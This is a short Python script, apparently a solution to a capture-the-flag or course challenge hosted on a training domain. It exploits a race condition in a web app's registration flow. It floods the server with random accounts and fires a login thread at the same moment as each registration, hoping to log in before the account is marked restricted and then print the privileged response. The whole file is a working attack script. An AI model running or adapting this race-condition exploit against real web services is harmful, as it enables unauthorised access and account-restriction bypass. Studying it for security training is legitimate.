import requests
import string
import random
from threading import Thread
import time

URL = "http://aart.training.jinblack.it"

def registration(s, u, p):
	url = "%s/register.php" % URL
	payload = {'username': u, 'password': p}
	r = s.post(url, data = payload)
	return r.text
	
def login(s, u, p):
	url = "%s/login.php" % URL
	payload = {'username': u, 'password': p}
	r = s.post(url, data=payload)
	if "This is a restricted account" not in r.text:
		print(r.text)
	return r.text
	
def randomString(N=10):
	return ''.join(random.choices(string.ascii_uppercase + string.digits, k = N))



while True:
	u = randomString()
	p = u
	print(u, p)
	#We don't need a password different from the username
	s = requests.Session() #it is gonna store the cookie for us
	t_reg = Thread(target=registration, args=[s,u,p]) #target is the name of a function
	t_login = Thread(target=login, args=[s,u,p])
	t_reg.start()
	t_login.start()
	time.sleep(0.1)